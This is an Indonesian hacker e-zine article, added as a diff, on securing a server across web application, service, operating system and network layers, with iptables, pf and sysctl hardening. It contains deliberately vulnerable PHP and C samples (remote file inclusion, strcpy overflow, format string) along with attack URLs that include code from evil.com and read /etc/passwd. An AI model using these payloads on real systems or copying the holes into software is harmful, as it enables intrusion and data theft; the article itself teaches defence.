@@ -1,0 +1,489 @@
+Terbitan Online Kecoak Elektronik
+http://www.kecoak-elektronik.net
+
+===========================================================================
+MANAGEMEN SEKURITAS : 4 LAYER SEKURITAS
+By : Ph03n1X || phoenix@kecoak-elektronik.net
+===========================================================================
+
+Security adalah masalah yang sangat kompleks dalam sebuah sistem dan jaringan komputer. 
+Membagi sekuritas menjadi beberapa layer sangat penting untuk penyederhanaan masalah 
+dan penanganan masing – masing bagian layer sekuriti itu. Berdasar pengalaman penulis 
+dan beberapa paper yang penulis baca, penulis membagi sekuritas dalam 4 layer umum untuk
+keperluan manajemen sekuriti sebuah sistem :
+
+sekuriti di layer website aplikasi : saat ini layer web aplikasi merupakan bagian yang 
+paling rawan dengan attacking, hal ini dikarenakan kemudahan dalam melakukan serangan 
+dan banyaknya bagian yang vulneral dari layer ini.
+
+sekuriti di layer service : service yang dimaksud disini adalah service seperti SSH, FTP, 
+HTTP, sedangkan sekuriti dilayer service dapat diartikan sebagai cara untuk mengamankan 
+service – service tersebut misalnya dari serangan remote buffer overflow, remote format 
+string exploitation, dan denial of service terhadap daemon – daemon yang menjalankan service 
+tersebut.
+
+sekuriti di layer sistem operasi : sekuriti dilayer ini ditekankan pada kernel dari sebuah 
+sistem operasi beserta software yang berjalan diatasnya, permasalahan forking terhadap 
+sistem yang menghabiskan resource sistem,denial of service level kernel, dan permasalahan 
+local eksploitasi seperti sys_ptrace() , sys_uselib(), dan vulnerability pada executable 
+root SUID file menjadi pokok masalah dilayer ini.
+
+sekuriti di layer jaringan : sekuriti dilayer ini biasanya dikaitkan dengan layer 1 sampai 
+dengan layer empat di model OSI, permasalahan spoofing MAC, ARP, IP, denial of service 
+(SYN, ACK, UDP, ICMP), TCP/IP hijacking menjadi masalah dilayer ini.
+
+Yang jadi masalah adalah biasanya seseorang sysadmin sebuah sistem belum tentu mendapat 
+akses ke gateway, router sehingga dia harus mengamankan box sistem sesuai dengan kekuasaannya. 
+Masalah semacam ini banyak sekali ditemui misalnya di kampus tempat saya kuliah sendiri. 
+Berikut ini sebuah paparan bagaimana mengamankan sistem anda dengan kuasa anda sebagai 
+sysadmin yang tidak memiliki akses ke komputer gateway ataupun firewall.
+
+PERMASALAHAN DI WEBSITE APLIKASI
+
+Ada beberapa masalah dilayer website yang mungkin sering terdengar saat ini : full path 
+disclosure, cross site scripting, HTML injection, remote/local file inclusion , remote 
+command execution, dan sql injection. Pada tulisan ini penulis asumsikan website dibangun 
+menggunakan PHP , code bagaimana yang membuat site dikatakan vulneral dan bagaimana 
+penanganan masalahnya akan penulis kupas menggunakan contoh – contoh kode PHP. Disini penulis
+hanya memberikan contoh kode full path disclosure dan remote file inclussion.
+
+1. Full Path Disclosure
+
+Full path disclosure adalah sebuah hole website aplikasi yang memungkinkan seseorang untuk 
+melihat lokasi (path) file didalam sistem secara penuh. Berikut ini sebuah contoh code 
+mengenai hole ini (simpan ketiga file dalam satu directory).
+
+file handle.php
+
+<?php
+function validate($char)
+{
+if(!is_numeric($char))
+die("I have received error from client\n");
+}
+?>
+
+file home.php
+
+<?php
+validate($_REQUEST['view']);
+echo "<H1>Ini View".$_REQUEST['view']."</H1>";
+?>
+
+file index.php
+
+<HTML>
+<?php
+include "handle.php";
+if(isset($_REQUEST['view']))
+{
+include "home.php";
+}
+?>
+</HTML>
+
+Untuk website yang close source terhadap codenya, kemudian bagian yang ditampilkan ke client 
+hanyalah index.php, maka code semacam ini mungkin tidak akan menjadi masalah, karena kita bisa
+saja menutupi file handle.php dan home.php. Namun untuk aplikasi opensource tentu saja dengan 
+mendowload aplikasi tersebut kita bisa tahu file apa saja yang ada dalam aplikasi. Nah ketika 
+request langsung diarahkan ke home.php hasilnya adalah PHP error dengan menampilkan secara 
+lengkap path file home.php.
+
+Fatal error: Call to undefined function validate() in /usr/local/apache2/htdocs/kck/home.php on line 2
+
+Untuk mencegah resiko semacam ini, maka perlu ditambahkan code untuk menolak akses secara 
+langsung ke masing – masing file PHP, misalnya dengan kita tambahkan di bagian paling atas 
+file home.php code seperti berikut ini :
+
+if (eregi("home.php", $PHP_SELF)) {
+die ("You can't access this file directly...");
+}
+
+Sehingga ketika file home.php diakses secara langsung maka browser akan merespons dengan 
+“You can't access this file directly..."”
+
+2. Remote File Inclussion
+
+Remote file inclussion merupakan salah satu hole aplikasi PHP yang mempunyai security risk 
+cukup tinggi karena seseorang bisa mengakses command – command console operating sistem via 
+web browser. Contoh code berikut memungkinkan remote file inclussion :
+
+<?php
+if(isset($_REQUEST[‘page’])){
+$page=$_REQUEST['page'];
+include "$page";
+echo "<H1>Ini halaman ".$_REQUEST['page']."</H1>";
+}
+?>
+
+Code diatas mengincludekan variable $page tanpa divalidasi terlebih dahulu, artinya kita bisa 
+mengincludekan sembarang evil file diremote site menggunakan variable $page, code diatas 
+sebenarnya juga merupakan contoh code local file inclussion sehingga ketika kita mengincludekan 
+/etc/passwd maka file /etc/passwd akan ditampilkan. Misal file diatas disimpan dengan nama 
+remote.php maka attacker bisa mengincludekan sembarang file menggunakan URL berikut :
+
+http://sitebego.com/remote.php?page=http://evil.com/evilcode.txt?
+http://sitebego.com/remote.php?page=../../../../../../../../../../../../etc/passwd
+
+Code diatas bisa diperbaiki dengan memberi validasi pada variable $page sebelum diincludekan 
+misalnya seperti berikut :
+
+$page=$_REQUEST['page'];
+if(preg_match('/[\'\"%|*(){}~`!@#$;\\/=+_^\>\<]/',$page))
+die("We have received an error request\n<br>");
+include “$page”;
+
+Sehingga ketika client merequest file dengan parameter variable $page cocok dengan karakter 
+yang ada difilter preg_match() akan muncul “We have received an error request ”. Satu hal 
+yang penulis anggap praktis untuk meminimalisasi resiko web based PHP exploitation adalah 
+dengan mensecurekan konfigurasi php.ini antara lain dengan : turn off display error, turn on 
+log error, disable fungsi untuk mengakses sistem seperti system(), exec(), passthru(), shell_exec(), 
+proc_open() dan lainnya, register global off, dan turn on safe mode .
+
+PERMASALAHAN DI SERVICE
+
+Sebuah server biasanya memberikan beragam service untuk kemudahan bagi client dan user. Misal
+diasumsikan sebuah server memberikan 2 buah service, SSH mengunakan OpenSSH, HTTP menggunakan 
+apache. Pada tulisan ini penulis hanya membahas masalah remote fingerprint dan remote exploitasi 
+terhadap daemon – daemon yang menjalankan service di SSH dan HTTP , sedangkan untuk masalah 
+lokal exploitasi penulis lebih mengcategorykannya sebagai masalah dilayer sistem operasi. 
+Masalah exploitasi terhadap daemon biasanya terjadi ketika report securiti (advisory) baru 
+tentang sebuah hole disebuah software dipublish dan bermunculan exploit – exploit di internet, 
+untuk mengatasi hal ini dibutuhkan kerja keras sysadmin untuk melakukan patch dan/atau upgrade 
+terhadap software yang digunakan dalam hal ini ugrade OpenSSH dan apache. Hole – hole di layer 
+ini biasanya berupa remote buffer overflow, remote format string exploitation, dan remote denial 
+of service terhadap daemon, sebagai contoh openssh channel lookup hole, openssh challenge response 
+buffer overflow, apache ap_escape_html memori allocation DoS, apache Mod_DAV LOCK DoS dan 
+sebagainya. Untuk memahami bagaimana daemon dari sebuah service bisa diexploitasi berikut ini 
+penulis mencoba membahas menggunakan sebuah contoh code daemon yang penulis buat sendiri untuk 
+menjelaskan bagaimana “remote denial of service yang dikarenakan oleh stack overflow membuat
+terminating service”.
+
+/*VULNERABLE DAEMON*/
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <signal.h>
+#define MAXBUF 20
+main()
+{
+int sock,port,newsock,len,pid;
+struct sockaddr_in server,client;
+char msg[MAXBUF];
+char readbuf[MAXBUF];
+if((sock=socket(AF_INET,SOCK_STREAM,0))<0)
+{
+fprintf(stderr,"Cannot create socket\n");
+exit(1);
+}
+port=8181;
+bzero((char *) &server, sizeof(server));
+server.sin_family = AF_INET;
+server.sin_port = htons(port);
+server.sin_addr.s_addr = INADDR_ANY;
+if(bind(sock,(struct sockaddr *) &server, sizeof(server))<0)
+{
+fprintf(stderr,"Binding on port %d is failed\n",port);
+exit(1);
+}
+if(listen(sock,5)<0)
+{
+fprintf(stderr,"Listen on port %d is failed",port);
+exit(1);
+}
+printf(“Ph03n1X – k-elektronik\n”);
+printf(“king_purba@yahoo.co.uk – http://kecoak-elektronik.net\n”);
+printf("Now listening on TCP port %d\n",port);
+pid = fork();
+if (pid < 0) {fprintf(stderr, "fork failed\n");
+exit(1);
+} else if (pid != 0) {
+exit(0);
+}
+setsid();
+chdir("/");
+umask(0);
+close(0);
+while(1)
+{
+len=sizeof(client);
+newsock=accept(sock, (struct sockaddr *)&client, &len);
+if(newsock<0)
+continue;
+bzero(readbuf,0);
+read(newsock,readbuf,sizeof(readbuf));
+strcpy(msg,readbuf); //Silakan diganti dengan strncpy(msg,readbuf,sizeof(msg))
+printf("%s",msg);
+sleep(10);
+close(newsock);
+}
+}
+
+Code diatas digunakan untuk membinding dan listen koneksi di port 8181 kemudian mengirim ekskusi 
+program ke background. Bagian fungsi strcpy() script diatas adalah bagian yang vulnerable dari 
+script daemon ini. Ketika sebuah koneksi dari client mengirimkan data lebih dari 20 character 
+yang terjadi adalah terminating services. Daemon yang ada dibackground mengalami stack overflow 
+sehingga mematikan service di port 8181. Permasalahan ini bisa diselesaikan dengan mengganti 
+strcpy(msg,readbuf) menggunakan strncpy(msg,readbuf,sizeof(msg)).
+
+$gcc -o vuln vuln.c
+$./vuln
+Ph03n1X – k-elektronik
+king_purba@yahoo.co.uk – http://kecoak-elektronik.net
+Now listening on TCP port 8181
+
+Menggunakan mesin lain dijaringan, coba koneksi menggunakan telnet kemudian kirimkan data lebih 
+dari 20 karakter ke sistem yang melisten diport 8181 tadi.
+
+$telnet 172.16.11.103 8181
+Trying 172.16.11.103...
+Connected to kaiten (172.16.11.103).
+Escape character is '^]'.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Connection closed by foreign host.
+
+$telnet 172.16.11.103 8181
+Trying 172.16.11.103...
+telnet: connect to address 172.16.11.103: Connection refused
+telnet: Unable to connect to remote host: Connection refused
+
+Masalah diatas, jika terjadi pada sebuah software akan sangat membutuhkan penanganan vendor untuk 
+fixing bugsnya baru kemudian sysadmin melakukan patching terhadap software yang digunakannya, 
+namun dengan sample code diatas diharapkan pembaca bisa membuat patch sementara ketika bugs muncul 
+sedangkan vendor belum membuat update atau patch.
+
+Masih banyak permasalahan diservice yang lain selain karena vulnerability code program, sebagai 
+contohnya adalah masalah brute forcing ssh dan http (htaccess). Belum lagi masalah yang mungkin 
+sepele seperti banner grabing yang sebenarnya merupakan hal yang sebaiknya disembunyikan kebocorannya. 
+Sebagai contohnya konfigurasi OpenSSH di /etc/ssh/sshd_config sebaiknya diset dengan : 
+hanya mengaktifkan protokol ssh 2, gunakan host key, tidak mengizinkan remote root login, memberi 
+maximum percobaan login dan kalo gagal disconnect atau bahkan blocking IP address yang coba login, 
+gunakan strict mode, gunakan password authentikasi, jangan diizinkan jika password kosong,gunakan 
+PAM.
+
+PERMASALAHAN DI SISTEM OPERASI DAN PROGRAM DIATASNYA
+
+Sistem operasi merupakan jantung dari semua aplikasi yang berjalan disebuah komputer, semua 
+service dan aplikasi tidak akan bisa digunakan tanpa adanya sistem operasi. Sistem operasi juga 
+yang mengatur penggunaan resource di komputer anda, sikap membatasi penggunaan resource harus 
+dilakukan untuk mencegah aktifitas percobaan menaikkan CPU process, misalnya untuk membatasi 
+maximum proses di OpenBSD box anda bisa dilakukan dengan menambahkan di /etc/sysctl.conf : 
+kern.maxproc=1000, kern.maxprocperuid=300, kern.maxfiles=4000,kern.maxfilesperproc=1030, atau 
+jika anda menggunakan linux box anda bisa menggunakan command ulimit (silakan dicoba : ulimit a)
+dan menaruhnya di /etc/profile untuk menyamakan penggunaan resource semua user, atau bisa
+menggunakan grsecurity patch. Masih banyak lagi masalah denial of service di level kernel linux
+yang tentu saja untuk mengetahui perkembangannya harus selalu update informasi security. Permasalahan 
+level sistem tidak hanya pada denial of service saja, masih ada permasalahan user priviledge 
+escalation (misalnya masalah SUID file) dan local root exploitation. Sebagai contohnya adalah 
+permasalahan local root exploitation menggunakan ptrace untuk kernel 2.4.x, sys_uselib() exploitation 
+menggunakan pwned dikernel 2.6.x, dan cdrdao suid pada mandrake 10. Untuk meminimalisasi resiko 
+local exploitation kita dapat memulainya sedari kita mensetup server(buat partisi disk untuk /tmp) 
+kemudian menerapkan rule mounting device di /etc/fstab lebih restrict. Hapus directory /var/tmp/ 
+kemudian buat simbolik link /var/tmp yang diarahkan ke directory /tmp/. Di bagian partisi yang 
+dimount ke /tmp berikan option noexec, nosuid sebagai berikut : 
+/dev/wd0e /tmp ffs rw,nodev,nosuid,softdep,noexec 1 2. 
+Dengan memberikan option noexec di /tmp yang merupakan directory favorite untuk local exploitation, 
+attacker menjadi tidak bisa mengekskusi script exploitsnya. Kemudian bagi pengguna linux sangat 
+disarankan menggunakan security patch seperti grsecurity, LIDS, atau SELinux. Berikut sebuah gambaran 
+code yang vulneral terhadap local exploitation based stack overflow dan format string. 
+
+1. Local Stack Overflow
+
+Local stack overflow terjadi ketika program mengekskusi inputan yang diberikan oleh user dengan 
+panjang inputan lebih dari yang dialokasikan. Kondisi ini akan menyebabkan program menerima sinyal 
+SIGSEGV kemudian muncul output segmentation fault.
+
+$cat localbuf.c
+#include <stdio.h>
+int main(int argc, char *argv[])
+{
+char helo[10];
+if(argc!=2)
+{
+printf("Ph03n1X kandangjamur security\n");
+printf("Usage : %s <karakter>\n",argv[0]);
+exit(0);
+}
+strcpy(helo,argv[1]);//strncpy(helo,argv[1],sizeof(helo))
+}
+
+$gcc -o localbuf localbuf.c
+$gdb localbuf
+(gdb) run AAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /usr/local/h4ck/latihan/kecoak/localbuf AAAAAAAAAAAAAAAAAAAAAAA
+Reading symbols from shared object read from target memory...(no debugging symbols found)...done.
+Loaded system supplied DSO at 0x83e000
+(no debugging symbols found)
+(no debugging symbols found)
+Program received signal SIGSEGV, Segmentation fault.
+0x08048483 in main ()
+(gdb)i r ebp
+ebp 0x41414141 0x41414141
+
+Bisa dilihat register ebp teroverwrite oleh AAAA (0x41414141), jika file ini diset SUID root maka 
+akibatnya adalah local root compromise. Kesalahan codenya ada di fungsi strcpy() yang tidak 
+memberikan batasan input user, dengan mengganti fungsi strcpy() menjadi strncpy() kejadian local 
+stack overflow bisa dihandle ketika user memasukkan input yang panjangnya melebihi buffer yang 
+disediakan.
+
+2. Local Format String
+
+Format string exploitation dapat terjadi karena kesalahan penerapan fungsi format string 
+seperti printf(), sprintf(), fprintf() dan yang lainnya pada sebuah program aplikasi. Berikut 
+sebuah contoh code untuk menjelaskan kesalahan format string.
+
+$cat localfms.c
+#include <stdio.h>
+int main(int argc, char *argv[])
+{
+char helo[10];
+if(argc!=2)
+{
+printf("Ph03n1X kandangjamur security\n");
+printf("Usage : %s <karakter>\n",argv[0]);
+exit(0);
+}
+printf(argv[1]); // fix printf(“%s”,argv[1]);
+printf("\n");
+}
+
+$gcc -o localfms localfms.c
+$localfms AAA
+AAA
+$localfms %p%p%p
+0x804965c0xbff4b7f80x8048301
+$localfms %x%x%x
+804965cbfdea1488048301
+
+Nah, bagian yang vulneral pada code diatas adalah kesalahan implementasi dari fungsi printf(argv[1]) 
+yang seharusnya kita ganti dengan printf(“%s”,argv[1]). Sekali lagi penulis tekankan bahwa setiap 
+saat ditemukan hole pada software atau program yang anda pakai jadi rajin – rajinlah update sistem 
+yang anda pakai. 
+
+PERMASALAHAN NETWORK MENJADI MASALAH HOST
+
+Permasalahan network disini dikaitkan dengan kerawanan protokol komunikasi seperti TCP, UDP, dan ICMP.
+Andaikan anda seseorang sysadmin yang punya kuasa hanya pada server yang anda tangani, namun tidak 
+punya akses ke firewall maka tidak ada salahnya mensetup simple firewall di server yang anda tangani 
+untuk merangkap firewall network. Masalah scanning port dan fingerprint OS juga penulis masukkan dalam 
+masalah network karena memanfaatkan respons protokol – protokol komunikasi. Selain dengan firewalling 
+pengaturan /etc/sysctl.conf juga bisa digunakan untuk memberikan restrict terhadap akses protokol via 
+kernel. Host firewalling dilakuan penulis karena beberapa alasan, pertama : biasanya firewall network 
+disetup untuk mengamankan jaringan dari internet, namun rule yang mengatur akses dari lokal network 
+ke server dibuat tidak terlalu restrict, yang kedua : ketika network terdiri dari beberapa server 
+yang masing – masing server memberikan service berbeda – beda maka rule firewall diset untuk mengallow 
+akses ke port – port service itu sekalipun service di server kita tidak membutuhkan allow port – port 
+terlalu banyak. Misal server anda hanya membuka ssh dan http, namun server yang lain membuka service ftp, 
+imap, imaps maka port – port ftp, imap, dan imaps bisa dimanfaatkan oleh attacker untuk pemasangan 
+backdoor seperti shv atau untuk keperluan remote exploitation dengan binding shellcode. Berikut penulis
+sertakan sebuah rule set iptables dan /etc/pf.conf openbsd yang digunakan untuk allow service ssh dan 
+http dengan sedikit restriction terhadap penggunaan protokol – protokol.
+
+1. Firewall host menggunakan iptables
+
+#!/bin/sh
+modprobe ip_tables
+modprobe ip_conntrack
+modprobe iptable_filter
+modprobe ipt_LOG
+modprobe ipt_limit
+modprobe ipt_state
+iptables -F
+iptables -X
+iptables -P INPUT DROP
+iptables -P OUTPUT ACCEPT
+iptables -P FORWARD DROP
+
+#TCP RULE INPUT
+#http://seclists.org/lists/nmapdev/2003/JulSep/0024.html
+iptables -A INPUT -p tcp -m multiport --destination-ports 0 -j REJECT
+iptables -A INPUT -p tcp ! syn -m state --state NEW -j REJECT
+iptables -A INPUT -p tcp --syn -m state --state NEW -m multiports --destination-ports 22,80 -m limit --limit 2/s -i eth0 -j ACCEPT
+iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT
+
+#ICMP RULE INPUT
+iptables -A INPUT -p icmp –icmp-type 0 -m limit --limit 2/s -i eth0 -j ACCEPT
+#ALL UDP INPUT BLOCKED kecuali dari port dns
+iptables -A INPUT -p udp --sport 53 -m limit --limit 2/s -i eth0 -j ACCEPT
+
+2. Firewall host menggunakan /etc/pf.conf BSD Family
+
+#Gunakan command pfctl -e untuk megenable packet filtering
+#gunakan pfctl -f /etc/pf.conf untuk meload rule packet filtering
+#Baca man pfctl untuk mengetahui lebih jauh tentang pf
+#Baca juga pf user guide di openbsd.org
+#MACROS
+
+INT="rl0"
+LO="lo0"
+PRIV="{127.0.0.0/24,172.16.0.0/16,172.20.2.0/24}"
+icmp_type_a="echorep"
+pass quick on $LO
+antispoof quick for {$LO $INT}
+port_open="{22,80}"
+#OPTION
+set skip on lo0
+#RULES
+block all
+#TCP INPUT RULE
+pass in on $INT inet proto tcp from any to $INT port $port_open flags S/SA keep state \
+(max 100, max-src-conn 20, max-src-conn-rate 15/5, max-src-states 3)
+#ICMP INPUT RULE
+pass in inet proto icmp all icmp-type $icmp_type_a keep state \
+(max-src-conn-rate 15/5, max-src-states 3)
+#ALL UDP INPUT BLOCKED kecuali dari dns
+pass in on $INT proto udp from any port 53 to $INT keep state \
+(max 100, max-src-conn 20, max-src-conn-rate 15/5, max-src-states 3)
+#OUTPUT RULE
+pass out on $INT proto tcp all modulate state flags S/SA
+pass out on $INT proto {udp, icmp} all keep state
+
+Kedua rule firewall diatas baik iptables maupun pf diset dengan mendeny semua paket terlebih dahulu 
+(untuk iptables default outputnya sengaja penulis accept) baru kemudian memberi allow kepada paket – 
+paket yang diperlukan. Rule firewall yang dibuat penulis lebih ditekankan pada rule input, karena 
+rule ini sengaja dibangun untuk sebuah host saja. Untuk TCP paket, paket yang diterima adalah paket 
+yang didahului oleh flags SYN dengan batasan limit paket untuk mencegah denial of service. Untuk ICMP, 
+paket icmp yang diterima adalah paket icmp echo reply agar server bisa ping keluar tapi tidak bisa 
+di ping ( dan command unix yang menggunakan icmp lainnya). Paket icmp echo reply ini masih dilimit 
+untuk menghindari serangan seperti smurfing attack. Semua paket UDP masuk sengaja penulis block kecuali
+paket UDP dari port 53 untuk keperluan resolv DNS karena host tidak menggunakan service yang 
+memanfaatkan protokol UDP. Selain menggunakan host firewalling restriksi terhadap protokol – protokol 
+jaringan juga sebaiknya diatur dari sistem dengan mengedit dan/atau menambahkan baris file 
+/etc/sysctl.conf sebagai berikut:
+
+# Controls the use of TCP syncookies
+net.ipv4.tcp_syncookies = 1
+#icmp problem
+net.ipv4.icmp_ignore_bogus_error_responses=1
+net.ipv4.icmp_echo_ignore_broadcasts=1
+net.ipv4.icmp_echo_ignore_all=1
+#Disable icmp redirection
+net.ipv4.conf.eth0.accept_redirects = 0
+net.ipv4.conf.all.accept_redirects = 0
+net.ipv4.conf.lo.accept_redirects = 0
+net.ipv4.conf.default.accept_redirects = 0
+#Enable IP spoofing protection
+net.ipv4.conf.eth0.rp_filter = 1
+net.ipv4.conf.all.rp_filter = 1
+net.ipv4.conf.lo.rp_filter = 1
+net.ipv4.conf.default.rp_filter = 1
+
+PENUTUP
+
+Sebenarnya masih banyak sekali permasalahan security basic yang harus diterapkan dalam sebuah host,
+namun mudah – mudahan tulisan ini bisa memberi gambaran global bagaimana seharusnya sekuritas diterapkan
+di host/server kita di dalam network walaupun masih banyak sekali kekurangan dari tulisan ini. Tulisan 
+ini sengaja penulis bahas dengan ruang lingkup tema yang cukup luas dengan memberi sedikit konsep dan 
+praktikal pada masing – masing sub tema dengan tujuan untuk agar semua materi pada 4 layering sekuriti 
+tercakup. Kemudian masalah lain seperti masalah scanning, footprinting, enumeration, TCP wrapper dan 
+IDS yang belum penulis bahas disini mudah – mudahan dapat penulis ulas di tulisan berikutnya. The last 
+but not least “keep study n learning to be the best”.
+
+REFERENCE
+
+1. http://iptablestutorial.frozentux.net/iptablestutorial.html
+2. http://www.openbsd.org/faq/pf/
+3. Computer Hacking By : Xnuxer
+4. Bugtraq security focus
+5. sysctl manual pages dan paper hack your own system by : z3r0byt3 (sorry kalo salah tulis)
